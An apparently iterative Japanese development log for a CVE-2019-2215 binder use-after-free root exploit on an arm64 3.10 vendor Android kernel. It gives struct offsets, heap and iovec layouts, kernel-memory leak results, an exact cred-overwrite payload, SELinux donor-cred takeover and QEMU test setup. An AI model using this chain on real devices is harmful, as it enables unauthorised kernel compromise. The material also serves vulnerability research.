推奨は `CVE-2019-2215`。理由は 4 点。

1. `/dev/binder`(0666) のみで完結し他のデバイスが不要
2. 3.10 に同型コードを実測で確認済み
3. arm64 の PoC 資産が複数ある
4. KASLR なしでベースアドレスが不要

工数見積は 2〜4 日（3.10 向けのオフセット再計算、SLUB grooming、`panic_on_oops` 下の安定化）。
既存 PoC は 4.4/Pixel2 向けでそのままは動かない、と正しく見積もっていた。

### 4.2 構造体オフセット（`pahole` 実測、ma04_defconfig）

```
struct binder_thread   size 296  -> kmalloc-512
  0x00 proc          0x08 rb_node      0x20 pid      0x24 looper
  0x28 transaction_stack              0x30 todo
  0x40 return_error  0x44 return_error2
  0x48 wait.lock     0x4C hole
  0x50 wait.task_list.next
  0x58 wait.task_list.prev
  0x60 stats

struct binder_proc     size 480  -> kmalloc-512
  0x00 proc_node  0x30 pid  0x38 vma  0x40 vma_vm_mm  0x48 tsk
  0x50 files  0x68 deferred_work  0x70 buffer  0x80 buffers
  0xC0 todo   0xD0 wait (lock 0xD0, next 0xD8, prev 0xE0)   0xE8 stats

struct __wait_queue_head: lock 0x00(4B) + hole + task_list 0x08(16B)
struct thread_info: flags 0x00, addr_limit 0x08, task 0x10  (16384B、16KB 整列)
struct task_struct: mm 424, real_cred 912, cred 920, comm 928,
                    pid 496, tgid 500, stack 8, signal 1944, sighand 1952
struct cred 160: usage 0, uid 4, gid 8, suid 12, sgid 16, euid 20, egid 24,
                 fsuid 28, fsgid 32, securebits 36,
                 cap_inheritable 40, cap_permitted 48, cap_effective 56, cap_bset 64,
                 jit_keyring 72, session_keyring 80,
                 security 112, user 120, user_ns 128, group_info 136, rcu 144
struct task_security_struct: osid 0, sid 4
struct eppoll_entry 72: llink 0, base 16, wait 24 (flags 24, private 32, func 40, task_list 48), whead 64
struct epitem 128: pwqlist 64, ep 80
```

`binder_thread` 296 B は `kmalloc_index(296)` → index 9 = kmalloc-512。
`iovec[32]` は 32 × 16 = 512 B で **同じ kmalloc-512**。1 スラブ 8 オブジェクト。
これが UAF の再確保を成立させる土台になる。

### 4.3 `binder_thread_read` のドレイン仕様（T13 で実測）

```
2129 行〜: binder_thread_read
  先頭で *consumed == 0 のとき BR_NOOP(0x0c) を 4 バイト書いて ptr += 4
  2177 行:  if (end - ptr < sizeof(tr) + 4) break;      /* sizeof(tr)=64 -> ゲート 68 */
```

`read_size` を変えた実測:

```
read_size=8   -> n=4   NOOP のみ
read_size=64  -> n=4    （NOOP 後 60 残 < 68）
read_size=68  -> n=4
read_size=72  -> n=8    NOOP + TRANSACTION_COMPLETE  ← 唯一の値
read_size=76+ -> n=12+  tcomplete が重複、または BR_REPLY まで出る
```

**`read_size = 72` だけが `NOOP(0x0c) + TRANSACTION_COMPLETE(0x06) = 8 バイト` を
確定で返し、到着した `BR_REPLY` をキューに残す。** この 72 は後に T68 でもう一度
独立に導出し直した（同じ結論）。

応答のバイト列（実測）:

```
0c 72 00 00  06 72 00 00          ← NOOP + tcomplete（ゲート成立）
0c 72 00 00  06 72 00 00 03 72 …  ← REPLY が先着していれば n=76
```

パーサは先頭 2 コマンドを読み飛ばす必要がある。

`get_service("activity")` は `BC_TRANSACTION` code 1 を handle 0 に送り、
interface token `android.os.IServiceManager`（UTF-16）を付けて得た。ハンドルは 1。

### 4.4 `binder_poll` のゲート（T7–T22 の中心課題）

```c
wait_for_proc_work = transaction_stack == NULL && list_empty(&todo) && return_error == BR_OK;
if (wait_for_proc_work) {
    ... poll_wait(filp, &proc->wait, wait);
} else {
    if (binder_has_thread_work(thread)) return POLLIN;
    poll_wait(filp, &thread->wait, wait);
}
```

`binder_get_thread` が新規スレッドに `BINDER_LOOPER_STATE_NEED_RETURN` を立てるので、
else 分岐では `binder_has_thread_work()` が真になり `poll_wait` の前に `POLLIN` を返す。
`NEED_RETURN` は `binder_ioctl` 末尾（2730 行）で解除される。

**必要な状態は「`transaction_stack != NULL`、`todo` 空、`return_error == BR_OK`」。**
同期 `BC_TRANSACTION` を送って `BR_NOOP` と `BR_TRANSACTION_COMPLETE` だけ排出すれば作れる。

分岐の判別方法も確立した。

| 観測 | 意味 |
| --- | --- |
| `epoll_wait(epfd, 0) == 0` | `poll_wait` に到達した（登録済み） |
| `epoll_wait(epfd, 0) == 1` | 早期 `POLLIN`（未登録） |

実測 110 回中 109 回で登録を確認。`poll()` の戻り値では判別できない
（両分岐とも 0）ことを T19 で実測して訂正した。

`epoll_ctl(ADD)` 後は epoll が binder の `struct file` 参照を保持するので、
`close(bfd)` だけでは `binder_release` が走らない。実際に解放するには `close(epfd)`
（`ep_free` → `ep_remove` → `ep_unregister_pollwait`）が必要。これも T14 で実測。

解除経路（ソース根拠）:

```c
ep_ptable_queue_proc()        /* ep_insert -> ep_item_poll -> poll_wait */
    add_wait_queue(whead, &pwq->wait);
    list_add_tail(&pwq->llink, &epi->pwqlist);

ep_unregister_pollwait()      /* ep_remove / ep_free から */
    list_del(&pwq->llink);
    ep_remove_wait_queue(pwq);

ep_remove_wait_queue()
    whead = rcu_dereference(pwq->whead);
    if (whead) remove_wait_queue(whead, &pwq->wait);   /* ここで list_del */
```

`pwq->whead` は `POLLFREE` を受けたときだけ NULL になる。binder 3.10 は
`wake_up_poll(POLLFREE)` を呼ばないので、**`ep_unregister_pollwait` が走れば
`remove_wait_queue` は必ず実行される**。

### 4.5 最初の 4 回のパニック（T23–T25）

最初の設計は誤っていた。`gate()` を「そのアドレスの 4 バイトが自分の fd 番号と一致するかを
判定する読み取り専用のオラクル」と解釈し、線形マップを数十万回スイープした。
**その結果 4 回カーネルパニックを起こした。**

```
k128: fault at ffffffc080000000, R0: ffffffc04c409000
      ページをマーカーで汚染して解放 → __wake_up_common のリストヘッドになった
k133: _text 直前のページを破壊
k134/k135: スイープが書き込みを撒いた
```

T23 の時点では原因を「`iov[4].iov_len = 4096` を入れたため `wait.lock` が
0x1000 になりチケットロックがスピンした」と推定した。これは前半は正しいが、
真の原因はもっと単純で「ゲートが書く」ことだった（9.3 節の `k138` で自己証明する）。

`iov[4].iov_len = 0` にすると `spin_lock` が通り、`list_del` に進む。
サーバー上でレイアウトを検算した:

```
wait.lock = 0x00000000  OK  (spin_lock will succeed)
wait.lock = 0x00001000  BAD -> spin_lock hangs, PANIC
```

### 4.6 最初のリーク成功（T26、11-05 06:53）

T26 で端末が復帰し、`broot3` 系の前身 `bask6` がリークに成功した。

```
t=740 gates=1 w=278528 errno=0 leaked=278528 LANDED
RESULT: LEAKED gates=1 total=278528 first=4141414141414141
```

278,528 バイトを吸い出し、うち 196,607 バイトがカーネル領域。

```
chunk+0x50 = 0xffffffc04dd83050
binder_thread = 0xffffffc04dd83000
```

リーク先頭 8 バイトが `list_del` の自己参照ポインタなので、追加計算なしで
`binder_thread` のアドレスが取れる。この性質は最後まで武器になった。

このとき先に「安全な判定」を確立している。`bsafe2`:

```
t=788 gates=1 w=81921 errno=0 drained=81921  LIST_DEL RAN
RESULT: LIST_DEL CONFIRMED SAFELY (gates=1)
```

`arch_spin_unlock` が `owner+1 = 0x10001` を `iov[4].iov_len` に書く性質を使い、
`writev` の戻り値だけで判別する。`81921 = 4*4096 + 0x10001` なら着弾、
`16384` なら未着弾。カーネルアドレスを触らないので落ちない。
**「壊れてもおかしくない操作の前に、壊れない計器を先に作る」** という規律がここで確立した。

リーク内容の分析:

```
+0000  50 30 d8 4d c0 ff ff ff   ← iov[5].base = chunk+0x50
+0008  50 30 d8 4d c0 ff ff ff   ← iov[5].len  = chunk+0x50
```

`chunk+0x200` / `0x400` / `0x800` / `0xc00` / `0xe00` は無線設定の構造体で、
`Broadcom`、`MESH-WIFI-9NU5U6`、`Buffalo-G-9E40-WPA3` などの SSID 文字列を含む。
`chunk+0x1000` 以降は **他の writev/readv の iovec 配列が大量に並んでいる**
（32 要素すべてが妥当な iovec のスロットが 100 個以上）。
上方向への線形書き込みで隣の iovec を書き換えられる、という見立てはここから来た。

ヒープスプレーも試した（48 個の writev スレッドをブロックさせて kmalloc-512 を埋める）。
**リークしなくなった。** スプレーが CPU0 のフリーリストを占有し、
free → alloc の同一タスク性を壊すため。この否定は最後まで有効だった。

### 4.7 書き込みプリミティブの主張と撤回（T27–T34）

T27 で `readv` 経由の任意アドレス書き込みを「確立した」と主張した。

```
handle=1 victim=0x2000c8000 TOTAL_IN=86033
t=1 gates=1 ret=86033 errno=0 victim=1 far=0 AIMED KERNEL WRITE
RESULT: ARBITRARY-ADDRESS WRITE CONFIRMED
```

判定は「自前ユーザーページの内容」で行い、`victim=1 far=0` だったので
測定器としては正しい形をしていた。

しかし T34 の QEMU 検証で破綻した。`bdry`（書き込み先をユーザーページにした
ゼロリスク試験）を実機と同じ UAF 経路で走らせると:

```
no servicemanager; using context manager handle 0
RESULT: split did NOT work (target untouched)
```

4 種類の送信形状すべてで `readv` が 81920 で止まり、ペイロードが目的地に現れない。

数字の矛盾:

```
iov[0..3]      = 16367
iov[4] 膨張後  = 65537
合計           = 81904
readv 戻り値   = 81920     ← 16 バイト多い
```

16 バイトは `iov[5]` に入ったはずなのに、`iov[5].base` の先は変わらない。

T34 では原因を「`remove_wait_queue` が `list_del` を使い、`__list_del` の後に
`entry->next`/`prev` を `LIST_POISON1/2` で上書きするため、`iov[5].base` が
`chunk+0x50` ではなく POISON を指す」と推定した。**これは誤りだった。**
`__remove_wait_queue` は `list_del`（`list_del_init` ではない）で、
自己参照の head に対しては `*(chunk+0x50) = chunk+0x50` を書くだけで、
POISON は entry（`pwq->wait.task_list`）側に入る。iov[5] に相当するのは head 側である。

T34 は「任意アドレス書き込み確立」を撤回し、危険な実機実験を停止した。
これは正しい判断だった。書込みが未確立のままカーネルアドレスへ書くと確実に落ちる。

### 4.8 `/proc/last_kmsg` が書き込み成功を証明（T28、11-05 08:04）

T28 でパニックのログを読んだ。

```
Unable to handle kernel paging request at virtual address 11223344556677a4
PC is at __free_pages+0x10/0x74
LR is at binder_deferred_func+0x5f8/0x7f0
Workqueue: binder binder_deferred_func
```

`11223344556677a4` はテストで書いたマーカー `0x1122334455667788` そのもの（下位に `+0x1c`）。
**書き込みは実際にカーネルメモリへ届いていた。** 落ちた理由は、書き込み先に選んだ
「ゼロ埋めスロット」が `struct page` の配列だったこと。`binder_deferred_func` が
`__free_pages()` を呼び、`page` として読んだ値がマーカーに化けていた。
プリミティブは正常で、狙い先が悪かっただけ。

同じ T28 で `binder_proc` のオフセットを再実測し、リークから一意に特定した。

```
BINDER_PROC 0xffffffc04dd83600
   proc_node.next = 0xffffffc06840e600
   tsk            = 0xffffffc04eff3c00
   files          = 0xffffffc07998e580
   buffer         = 0xffffff8005c80000
   todo           = 0xffffffc04dd836c0   （自己参照）
   wait.lock      = 0
   pid            = 1346
```

ただし後述のとおり `proc->tsk` は最終的に「信用できない」と判定され、
署名スキャン（pid/tgid/comm/real_cred==cred の 4 点一致）が採用された。

### 4.9 QEMU の構築（T26、T33）

端末が USB 無応答の間に、**同じベンダーカーネルを QEMU で起動**して
exploit を実際に走らせる環境を作った。これが QEMU 完全チェーン（第 5 章）の全成果を支えた。

ビルドには 4 つの壁があった。

| 壁 | 対処 |
| --- | --- |
| gcc14 で `compiler-gcc14.h` が無い | `compiler-gcc4.h` をコピー |
| dtc の `yylloc` 重複 | `HOSTCFLAGS += -fcommon` |
| `-Werror=…` 系の新規エラー | `-fgnu89-inline` と `-Wno-error=` を複数 |
| `CONFIG_NETFILTER` で `xt_mark.h` 不在 | `CONFIG_NETFILTER=n` |

起動には 4 つのベンダーパッチが必要だった。

1. `drivers/irqchip/irq-pxa1928.c` — `arch_early_irq_init` が `mrvl,mmp-ciu` 無しで 0 を返す
2. `drivers/misc/regs-addr.c` — `iomap_register` を dummy page フォールバックに
3. `arch/arm64/mach/pxa1928_lowpower.c` — `pxa1928_lowpower_init` が 0 を返す
4. `drivers/misc/arm-coresight.c` — coresight ノード無しで `arch_coresight_init()` をスキップ

さらに initramfs 側で 4 つの罠を踏んだ。

| 罠 | 対処 |
| --- | --- |
| `mknod(10,63)` が ENODEV | `misc_register` は `MISC_DYNAMIC_MINOR`。`/sys/class/misc/binder/dev` を読む（実測 **10:62**、ashmem 10:61） |
| handle 0 が `BR_DEAD_REPLY`(29189) | init が `BINDER_SET_CONTEXT_MGR` を取り fd を保持 |
| `security_binder_transaction` が `BR_FAILED_REPLY`(29201) | selinuxfs をマウントして `enforce=0` |
| `sched_setaffinity` が syscall 293 でトラップ | `BINDER_TEST_QEMU=1` で呼ばない |

結果:

```
[boot] userland init running
GATE_OK tried=1
drain=8 bytes=0c720000 06720000
epoll_wait=0
```

ゲートが実機カーネル上で成立した。
耐久試験も通した。

```
qgate4: leaky rounds=2000 gate_open=2000 early=0 rejected=0
qgate4: clean rounds=2000 gate_open=2000 early=0 rejected=0
```

### 4.10 binder 前期の到達点

| 段階 | 状態 | 根拠 |
| --- | --- | --- |
| binder の自由操作 | 達成 | `/dev/binder` を mmap し `GET_SERVICE("activity")` でハンドル 1 |
| 構造体オフセット | 達成 | pahole |
| ドレイン仕様 | 達成 | 68 バイト境界、`read_size=72` |
| 分岐判定 | 達成 | `epoll_wait==0` |
| 待ち行列登録 | 達成 | 110 回中 109 回 |
| カーネルメモリのリーク | **達成** | 278,528 バイト、`binder_thread` アドレス取得 |
| 任意書き込み | **未達**（主張を撤回） | `bdry` で split 不成立 |
| root | 未達 | — |

---

## 5. QEMU 完全チェーン（T35–T38・T41、11-05 11:53–21:26）

端末はこの間ずっと USB から消えていた。QEMU だけで進めた局面である。

### 5.1 昇格の成功（T35）

```
pid=68 uid=2000 scan=64MB
  task_struct at leak+0x521fb0 -> 0xffffffc033b2e400
  cred=0xffffffc033aea180 entering cred-write phase, uid=2000
  cred t=1 landed=1 uid=0
AFTER: uid=0 euid=0 gid=0
RESULT: ROOT CONFIRMED
```

init が `setgid(2000); setuid(2000)` してから `exec` しているので、昇格前は確かに非特権。

決定的だったのは 3 点。

1. **`base` が 16 バイトずれていた。** 前ラウンドで「書き込み未確立」と断定したのは誤りで、
   実際は 16 バイト手前に届いていた（`payload at 614384 = 0x95ff0 = TARGET - 16`）。
   aim が `iov[5]` を書き換え、ペイロードは `iov[5].base` をそのまま使う。
   `base = addr - 16` ではなく **`base = addr`**。直した瞬間に着弾した。
2. **リークの DEL タイミング。** `FIONREAD` で計ると親の最初のコピーと競合する。
   **固定 8ms 待って DEL、そのあと drain** にしたら 64MB が 1 回で読めた。
3. **`binder_proc` の探索をやめた。** 後述のとおり `proc->tsk` は信用できない。

### 5.2 再現性（T36–T37）

```
[boot] broot3 run 1 exit=0
[boot] broot3 run 2 exit=1     ← リーク窓に task_struct がなかった
[boot] broot3 run 3 exit=0

ROOT confirmed: 3
real failures: 0
```

run 2 の原因は `RESULT: task_struct not found in the window`。
**昇格した回はすべて 1〜数回の書き込みで成功している。**

```
  cred t=1 landed=0 uid=2000    ← 1回目は着弾せず
AFTER: uid=0 euid=0 gid=0       ← リトライで成功
  cred t=1 landed=1 uid=0       ← 1回目で成功
```

窓に `task_struct` が入らない問題には外側リトライを入れた。
**もう一度リークすれば `chunk` が移動して別の範囲が見える。**

窓を意図的に 8MB に縮めて必ず外れる状況を作り、6 回とも
`task_struct not in this window` を出してから
`task_struct not found after retries` でクリーンに終了することを確認した。
ループが壊れず無駄な書き込みもしない。

初版のループは 1 回目が外れると `bfd` を閉じたまま 2 回目の `do_bigleak()` に入り、
500 秒以上 `-11` を吐いてタイムアウトした。ループ先頭で `open_binder()` と
`get_service()` をやり直すようにして解消。

再接続の順序も確定した。**`munmap` → `close` → `open` の順でなければならない。**
`close` が先だと vma が残り、`binder_proc` が解放されず次の接続が汚れた todo を継承する。
T41 で実測して確定した。

### 5.3 ケーパビリティ欠如の修正（T38）

前ラウンドの「root」は半分だった。`cred+4` に 40 バイトのゼロを書いたため、
覆われたのは `uid`〜`cap_inheritable` まで。

```
payload: cred+4 .. cred+43
  uid..fsgid       ZEROED
  securebits       ZEROED
  cap_inheritable  ZEROED
  cap_permitted    ← 触っていない
  cap_effective    ← 触っていない
```

**uid 0 でも `CAP_DAC_OVERRIDE` が無ければ root らしいことはできない。**

ペイロードを 60 バイトに伸ばした。

```
cred+4  .. +35   uid/gid/suid/sgid/euid/egid/fsuid/fsgid = 0
cred+36 .. +39   securebits      = 0
cred+40 .. +47   cap_inheritable = 0
cred+48 .. +55   cap_permitted   = 0x0000001fffffffff
cred+56 .. +63   cap_effective   = 0x0000001fffffffff
```

`CAP_LAST_CAP` は 36（`CAP_BLOCK_SUSPEND`）なので全ケーパビリティは `0x1fffffffff`。

実測:

```
  cred t=2 landed=1 uid=0
AFTER: uid=0 euid=0 gid=0
  CapPrm: 0000001fffffffff
  CapEff: 0000001fffffffff
  CapBnd: 0000001fffffffff
open(/secret.txt 0600 root)=29 errno=0
  read: topsecret
RESULT: ROOT CONFIRMED uid=0 euid=0
```

3 回すべて同じ結果。`CapEff` が全ビット立ち、root 所有 0600 のファイル
`/secret.txt` を実際に開いて中身を読めている。`CAP_DAC_OVERRIDE` が効いている証拠で、
uid だけ 0 にした状態では絶対に通らない。

### 5.4 SELinux ドメインは取れないと確定（T36）

`cred.security`（+112）は書き換えていないので、uid は 0 だがドメインは `shell` のまま。
ドメインも取ろうと 2 方式試したが、どちらも不可能だった。

| 試み | 結果 |
| --- | --- |
| `cred->security` の sid を 1 に | **`cred` がリーク窓の外**（負のオフセット）にあり、ポインタを読めない |
| kthread の `cred` を丸ごと横取り | `comm` 文字列が `.rodata` にも一致して偽陽性。検証を厳格化すると**本物の kthread が窓に居ない** |

偽陽性のまま書き込むと `security_task_wait` が NULL 参照で落ちる（実測）。
検証を厳格化（`usage` 妥当、`uid`〜`egid` 全ゼロ、`cap_effective` 全ビット、
`security` がカーネルポインタ）すれば落ちなくなるが、**採用できるドナーが窓に存在しない**
ため無効化した。

一方 T41 では QEMU で donor cred 採用方式が通った。

```
  donor cred 0xffffffc033422b40 (usage=2 sid=1)
  swap t=1 landed=1 uid=0 euid=0
CapEff: 0000001fffffffff
context: kernel
RESULT: ROOT CONFIRMED uid=0
```

uid 0 と SELinux カーネルドメインを同時に取得。
3 方式の比較:

| 方式 | 結果 |
| --- | --- |
| `cred+4` ゼロ化 | shell ドメインのまま |
| 合成 cred | `cred->user`(+120)/`cred->user_ns`(+128) が NULL で `/proc` の `from_kuid` がクラッシュ |
| **実在 cred 採用（donor）** | **安全で完全**（uid 0 + kernel ドメイン） |

ただし実機では `cred` が窓の外にあるため donor 方式は使えず、
最終的に実機では別の手段（AVC キャッシュ書換え → モジュール）で完全 root を得た。

### 5.5 `binder_proc->tsk` は信用できない（T41）

QEMU で `proc->tsk` と署名スキャンが一致しない run が出た。
さらに `proc->tsk` の先に書いても uid が変わらなかった。
**署名スキャン（pid==tgid==getpid、comm 一致、real_cred==cred）が正**で、
`binder_proc` は保険に降格した。

この判断は最後まで維持された。T48 以降、実機では署名スキャンだけを使う。

---

## 6. 実機 binder の壁（T39–T52、11-05 18:41–11-06 05:53）

QEMU では通る完全チェーンが、実機では通らなかった局面。
6 時間以上を費やし、最終的に「binder UAF の書込み経路は実機では構造的に閉じている」と
結論するまでの記録。

### 6.1 readv の再確保 0/8000（T43、11-06 00:10）

`iov[5].base = NULL` を判別子にし、ゲート失敗ごとに
`munmap → close → open → get_service` を必ず行う broot3 と同一の再接続規律で 8000 回試した。

```
RATE reclaim=0/8000 nogate=7834 other=166 best=0
```

一度も起きていない。同一カーネル・同一スラブ・同一ゲート手順で
`writev` は繰り返し `67141632` バイトを返す。**方向だけが違う。**

しかし T47 以降、この「0/8000」自体が計器の問題であることが分かる。

### 6.2 「膨張 17」の誤認と撤回（T44–T46）

T44 で次のように主張した。

```
broot3 leak:  ret=67141632
  iov[0..3]=16367  iov[5]=67125248  sum=67141615
  difference = 17  ->  iov[4].iov_len became 17
```

T46 で撤回した。

```
do_bigleak は iov[0..3] を 4 ページ丸ごと（16384）に設定している。
私は書き込み用の IOV3_LEN = PAGE-17（16367）を誤って使っていた。

正: iov[0..3] = 16384, iov[5] = 67125248, 合計 = 67141632 = 観測値（差0）
誤: iov[0..3] = 16367 → 差17を膨張と誤認
```

**膨張は起きていない。** 計器の定数が 2 系統混ざっていたのが原因。
書き込み用レイアウト（3 ページ + `PAGE-17`）とリーク用レイアウト（4 ページ）を
同じ定数で扱っていた。これは以降も何度か再発する罠である。

T46 では `devaim` で aim の着地点を直接観測した。

```
readv=16375  infl17=0
userpage=0x4141414141414141   (aim は届いていない)
sink@40 =0x0000000200096000   (iov[5].base にユーザポインタ)
sink+16 =0x1122334455667788   (payload がその16バイト後)
```

aim と payload は `iov[5].base` の指す先に書かれ、`chunk+0x50` には触れていない。

`PREW` の計算も間違えていた。当初 `4*PAGE`（16384）にしていたが、
`iov[0..3]` の実合計は 16351。**33 バイト遅く**、aim が `iov[5]` の 33 バイト目に落ちていた。

### 6.3 4 つの独立測定が「膨張なし」で一致（T46）

| 測定 | 試行 | 結果 |
| --- | --- | --- |
| readv（`iov[5].base=NULL` 判別子） | 800 | 0/800 |
| recvmsg（socket） | 800 | 0/800 |
| recvmsg（dwell 型ゲート） | 100 | 0/100 |
| devaim（aim を直接観測） | 40 | infl17=0、aim は `iov[5].base` 着地 |

ゲートの 2 方式もここで整理した。

```
n == 8   厳密型。broot3 はこれで成功（実測 40 回中 4 回開く）
n == 76  dwell 型。毎回開くが、この状態では再確保が起きない
```

### 6.4 「再確保なし」の断定と撤回（T47–T48）

T47 で `lkr3`（`iov[5].base` を未マップの `0x12340000`）を作り、
「再確保なし」を決定的に確認したと報告した。

```
bigleak: ret=4096 errno=0
land: pool[0]=0x5a5a5a5a5a5a5a5a pool[4p]=0x4141414141414141
```

T48 でこれを撤回した。**計器の配線ミス**だった。

`iov[4].base` を `pool`（0 ページ目）に向けており、`iov[0]` が同じページを埋めるため
変化が見えなかった。`can.c` で同一プロセス内で `iov[4].len` だけを変えて交互に回した。

| モード | `iov[4].len` | 結果 |
| --- | --- | --- |
| CANARY | 4096 | **専用ページが `0x5a` で埋まる（19/19）** |
| LEN0 | 0 | 専用ページは `0x41` のまま（0/19） |

**CANARY が通った = コピーは `iov[4]` に到達している。**
`ret=12288` の謎も解けた。`pipe_read` はバッファ単位でしか `ret` を加算しない。
4 番目のバッファが `iov[3]` に 4079 バイト書き、`iov[4]`（len=0）をスキップし、
`iov[5].base=0x12340000`（未マップ）で EFAULT。だから `ret` は 12288 のまま。
4079 バイトは実際に着地しており、停止点はちょうど `iov[5]`。

同じ T48 で `in2.c` の分布測定が 58 回中 1 回 `ret=81928` を出した。

```
81928 = 16367 (iov[0..3]) + 65537 + 24
```

`arch_spin_unlock` は `stlrh`（**半語ストア**）で、`0x00010000` の下位 16 ビットに
`0x0001` を書くため `0x00010001 = 65537`。
**膨張は実機で起きる。確率は約 1.7%。**

低確率なので数十回では「起きない」ように見えていた。これが長らくの誤認の原因。

### 6.5 非枯渇パイプでの確定測定（T49、11-06 04:37）

T49 で「膨張なし」を改めて確定した。

これまでの測定はすべて**パイプ枯渇**で汚染されていた。
`pipe_read` はバッファが尽きた瞬間に返るため、子が 1 ページずつ書くと
親は 1 ページで目覚めて終了し `iov[4]` に到達しない。

`probe2` は子が 1 回の `write()` で全バーストを流し込む（パイプ 256KB）。
全バッファが同時に現れるのでドレイン中に空になる瞬間がない。

```
r=131072 e=0 win_words=0 decoy=0x5a5a5a5a5a5a5a5a
```

全バースト消費され枯渇しておらず、`iov[4]` のページには 1 バイトも書かれず、
データは `iov[5]` に流れた。100/100 で同じ。

前ラウンドで膨張の証拠とした `ret=81928` は**子が書いたバイト数そのもの**で、
`AIMOFF 81904 + aim 16 + payload 8 = 81928` の合計だった。
`81928 = 16367+65537+24` の分解は偶然の一致で、65537 を膨張と読んだのは誤り。

T49 の結論は「実測は 0 のまま、つまり wait_queue のロックがこのチャンク上で動いていない
= iovec 配列が解放済み `binder_thread` を再確保していない」。

### 6.6 書込み計器の原理的盲目（T51、11-06 05:25）

T51 で決定的な設計ミスを発見した。

`pipe_iov_copy_from_user` は `dst = パイプページ`、`src = iov->iov_base`。
`iov_base` は**読み取り元**なのでユーザーメモリは変化しない。
`iov[4].base` にメータページを向けても永遠に観測できない。

`readv` は `copy_to_user(dst = iov->iov_base)` なので観測できる。

**writev 方向で回した broot3 計装版、probe、w1–w4、lk6 はすべて設計上盲目だった。**
これが T50–T52 の混乱の正体である。

### 6.7 QEMU は再確保を再現しない（T52、11-06 05:53）

T52 で確定した。

- `qk`（broot3 のリークを逐語コピー）で `base=NULL` でも `w=16384` で `iov[5]` に停止
- `qh` の未マップ HOLE も NULL も両方 16384
- `ld5` の writev + `list_del` 狙いも `r=81920` で宣言合計のまま

QEMU のゲートは `0x11`（`BR_FAILED_REPLY`）を返し、handle 0 に対応する node が無い。
実機とはスレッド状態が違う。

一方実機では同じコードが `67141632` を返し、`dev.bin` に
linear-map カーネルポインタ 62 個、SLUB POISON 716 回、パディング 866 回を含む。
**ユーザーマッピングでは生成し得ない内容**である。

**再確保は実機のみで起き、QEMU は書込み経路の検証に使えない。**
これで QEMU と実機の測定が噛み合わなかった理由が説明できた。
QEMU はゲート・幾何・算術の検証には使えるが、再確保には使えない。

### 6.8 実機 binder の到達点

| 項目 | 状態 |
| --- | --- |
| ゲート | 実機で成立（厳密型は低頻度、dwell 型は毎回） |
| 幾何・順序・aim | 実機で確定 |
| 再確保 | 実機で観測できず（後に T75 で成功） |
| 書込み | 未達 |
| root | 未達 |

---

## 7. 幾何と計器の総点検（T50–T62、11-06 04:37–07:17）

この局面の主題は「dev.bin（33MB の実機リーク）をバイト単位で読み直すこと」と
「ユーザ空間からの幾何検証が原理的に不可能であることを認めること」だった。

### 7.1 dev.bin だけで機構を証明（T53、11-06 06:14）

新規の実機実験なしに、既存の `dev.bin` / `dev2.bin` の解析だけで機構を証明した。

```
0x41 のフィラーがバイト 0..81920 の 81921 バイトで終わる
81921 = 16384 (iov[0..3]) + 65537 (0x10001)
```

つまり `iov[4].len` が 65537 に膨張した動かぬ証拠である。

その直後の 2 ワードが両方 `0xffffffc05c826a50` で `chunk+0x50` を指しており、
`list_del` が `iov[5]` を書き換えた証拠。

機構を 1 本の連鎖として書くと:

```
binder_get_thread の init_waitqueue_head()
    wait.task_list.next = prev = chunk+0x50

epoll_ctl(DEL) → __remove_wait_queue → list_del(&old->task_list)
    __list_del が head->next = head / head->prev = head を書く
    → *(chunk+0x50) = chunk+0x50
    → *(chunk+0x58) = chunk+0x50

同じく DEL の中の arch_spin_unlock
    stlrh で chunk+0x48 の下位 16bit に 0x0001
    → iov[4].iov_len が 0 から 0x00010001 = 65537
```

`iov[4].iov_base` は `list_del` に触られないので、`readv` で
`pipe_iov_copy_to_user` が `iov[4].iov_base` に向けて最大 65537 バイト書く
任意カーネル書き込みになる。これが書込み経路の正しい理解である。

過去の測定失敗理由も同時に判明した。

| 失敗 | 理由 |
| --- | --- |
| `iov[4].base = pool` | `iov[0]` が同じページを埋める |
| `pool+TRUE` で readv | dwell ゲートを使っていた（再確保は厳密ゲートのみ） |
| `iov[5].base = NULL` | `copy_from_user` が `access_ok` 失敗時に `memset(to,0,n)` して成功扱い |
| writev のメータ | 読み取り方向なのでユーザーメモリが変化しない（T51） |
| QEMU | ゲートが `0x11` を返し再確保しない（T52） |

### 7.2 access_ok は長さ 0 でもカーネルアドレスを拒否（T54）

QEMU 実測:

| 呼び出し | 結果 |
| --- | --- |
| `readv` mapped user len=0 | `r=0` 受理 |
| `readv` unmapped user len=0 | `r=0` 受理 |
| `readv` NULL len=0 | 受理 |
| `readv` kernel `0xffffffc000000000` len=0 | **EFAULT** |
| `readv` kernel `chunk+0x50` len=0 | **EFAULT** |
| `writev` 同上 | 同様 |

`iov[N].base` に直接カーネルアドレスを置く経路は、膨張前の取り込みで塞がれている。

また `copy_from_user` は `access_ok` 失敗時に `memset(to,0,n)` して成功扱いするが、
`copy_to_user` にはその else が無く、単にコピーしない。
これが `iov[5].base=NULL` での判別を不可能にしていた理由である。

### 7.3 aim はパイプバッファ末尾 16 バイトでなければならない（T55）

`pipe_iov_copy_to_user` は**パイプバッファごとに呼ばれ**、
パイプバッファはストリーム上 4096 バイト境界なので、
aim が 1 バッファに収まらないと後続の配列まで壊す。

| レイアウト | `iov[0..3]` | `AIMOFF` | `mod 4096` | aim に使えるバイト |
| --- | --- | --- | --- | --- |
| 書き込み用（3 ページ + `PAGE-17`） | 16367 | **81904** | 4080 | **16** |
| リーク用（4 ページ） | 16384 | 81921 | 1 | 4095 |

実測では `iov[0..3]=16384` のとき `iov[5]` は書き換わるが `iov[6]` 以降も
巻き添えで壊れ、PAT が TGT に届かなかった。
**書き込みには 16367 のレイアウトだけが 16 バイトの単一エントリ aim を許す。**

### 7.4 ユーザ空間からの幾何検証は原理的に不可能（T56、11-06 06:47）

```
readv(fd, iovs, 32)
```

`iovs` は**ユーザポインタ**として渡される。カーネルは `rw_copy_check_uvector` で
**プライベートな kmalloc 配列にコピー**し、そちらを歩く。

**したがって `&iovs[5]`（ユーザメモリ）に書いても、カーネルの歩行には一切影響しない。**
T55 で「自己参照が成立した」と報告したのは、**自分が初期化した値がそのまま残っていただけ**で、
何も測定していなかった。

`chunk+0x50` はカーネルのプライベート配列の中にのみ存在し、その配列は
syscall の間だけ生きる。**ユーザ空間からの幾何検証は原理的に不可能である。**

これは重要な認識の転換だった。以後、幾何は「算術で詰める」しかない。

### 7.5 do_write の 3 バグ（T57、11-06 06:56）

| # | バグ | 実測 | 修正 |
| --- | --- | --- | --- |
| 1 | aim の事前減算が 16 足りない | `pipe_iov_copy_to_user` は aim を書いた直後に必ず `iov->iov_base += copy`（copy=16） | `base = addr` → `base = addr - 16` |
